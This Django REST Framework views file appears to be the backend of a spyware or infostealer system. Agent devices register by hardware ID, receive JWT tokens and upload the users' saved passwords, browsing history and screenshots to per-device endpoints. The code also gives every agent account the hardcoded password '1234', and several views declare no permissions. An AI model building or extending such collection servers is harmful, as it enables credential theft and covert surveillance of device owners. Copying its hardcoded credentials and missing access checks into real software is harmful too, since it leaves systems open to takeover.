from django.shortcuts import get_object_or_404
from backend.models import *
from .serializers import *
from rest_framework import generics
from rest_framework.decorators import api_view,permission_classes
from rest_framework.response import Response
from rest_framework import status
from rest_framework.views import APIView
from django.contrib.auth import authenticate
from rest_framework_simplejwt.tokens import RefreshToken, AccessToken
from rest_framework_simplejwt.exceptions import InvalidToken, TokenError
from .permissions import FirstAgentPermission

class DevicesView(generics.ListCreateAPIView):
    queryset = Devices.objects.all()
    permission_classes = [FirstAgentPermission]
    
    def get_serializer_class(self):
        if(self.request.method == 'GET'):
            return DeviceSerializer
        else:
            return DeviceDetailSerializer
        

    def create(self, request, *args, **kwargs):
        hardware_id = request.data.get('hardware_id')
        if not hardware_id:
            return Response({'error': 'hardware_id is required'}, status=status.HTTP_400_BAD_REQUEST)

        user = CustomUser.objects.create(username=hardware_id)
        user.set_password('1234')  
        user.save()

        # Generate a JWT token for the user
        refresh = RefreshToken.for_user(user)
        refresh['role'] = 'agent'
        refresh['username'] = user.username  

        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        self.perform_create(serializer)

        response_data = {
            'hardware_id': hardware_id,
            'token': {
                'refresh': str(refresh),
                'access': str(refresh.access_token),
            },
            'device_details': serializer.data,
        }
        return Response(response_data, status=status.HTTP_201_CREATED)

class DeviceDetailView(generics.RetrieveUpdateAPIView):
    serializer_class = DeviceDetailSerializer
    def get_queryset(self):
        pk = self.kwargs['pk']
        return Devices.objects.filter(hardware_id = pk)
    
class PasswordView(generics.ListCreateAPIView):
    serializer_class = PasswordSerializer

    def get_queryset(self):
        pk = self.kwargs['pk']
        return Passwords.objects.filter(device=pk)

    def create(self, request, *args, **kwargs):
        pk = self.request.auth.get('username')
        device = get_object_or_404(Devices, hardware_id=pk)

        if isinstance(request.data, list):
            serializer = self.get_serializer(data=request.data, many=True)
            serializer.is_valid(raise_exception=True)
            serializer.save(device=device)
        else:
            serializer = self.get_serializer(data=request.data)
            serializer.is_valid(raise_exception=True)
            serializer.save(device=device)

        return Response(serializer.data, status=status.HTTP_201_CREATED)
    

class HistoryView(generics.ListCreateAPIView):
    serializer_class = HistorySerializer
    
    def get_queryset(self):
        pk = self.kwargs['pk']
        return History.objects.filter(device = pk)
    
    def create(self, request, *args, **kwargs):
        pk = self.request.auth.get('username')
        device = get_object_or_404(Devices, hardware_id=pk)

        if isinstance(request.data, list):
            serializer = self.get_serializer(data=request.data, many=True)
            serializer.is_valid(raise_exception=True)
            serializer.save(device=device)
        else:
            serializer = self.get_serializer(data=request.data)
            serializer.is_valid(raise_exception=True)
            serializer.save(device=device)

        return Response(serializer.data, status=status.HTTP_201_CREATED)

        
    
    
class ScreenshotView(generics.ListCreateAPIView):
    serializer_class = ScreenshotSerializer
    
    def get_queryset(self):
        pk = self.kwargs['pk']
        return Screenshot.objects.filter(device=pk)

    def create(self, request, *args, **kwargs):
        pk = self.request.auth.get('username')
        device = get_object_or_404(Devices, hardware_id=pk)

        if isinstance(request.data, list):
            serializer = self.get_serializer(data=request.data, many=True)
            serializer.is_valid(raise_exception=True)
            serializer.save(device=device)
        else:
            serializer = self.get_serializer(data=request.data)
            serializer.is_valid(raise_exception=True)
            serializer.save(device=device)

        return Response(serializer.data, status=status.HTTP_201_CREATED)
    


@api_view(["POST",])
@permission_classes([])
def RegisterView(request):
    serializer = RegistrationSerializer(data=request.data)
    if serializer.is_valid():
        account = serializer.save()
        data = {
            'response': 'Successfully registered a new user',
            'username': account.username,
        }
        
        # Create JWT token with custom claims (role and username)
        refresh = RefreshToken.for_user(account)
        refresh['role'] = account.role  # Add role to JWT token
        refresh['username'] = account.username  # Add username to JWT token
        
        data["review"] = {
            'refresh': str(refresh),
            'access': str(refresh.access_token),
        }
        
    else:
        data = {'error': serializer.errors}
    
    return Response(data)



class LoginView(APIView):
    permission_classes = []

    def post(self, request):
        username = request.data.get('username')
        password = request.data.get('password')
        
        user = authenticate(username=username, password=password)
        if user is not None:
            refresh = RefreshToken.for_user(user)
            refresh['role'] = 'user'
            refresh['username'] = user.username
            data = {
                'message': 'Login successful',
                'access': str(refresh.access_token),
                'refresh': str(refresh),
            }
            return Response(data, status=status.HTTP_200_OK)
        else:
            return Response({'error': 'Invalid credentials'}, status=status.HTTP_400_BAD_REQUEST)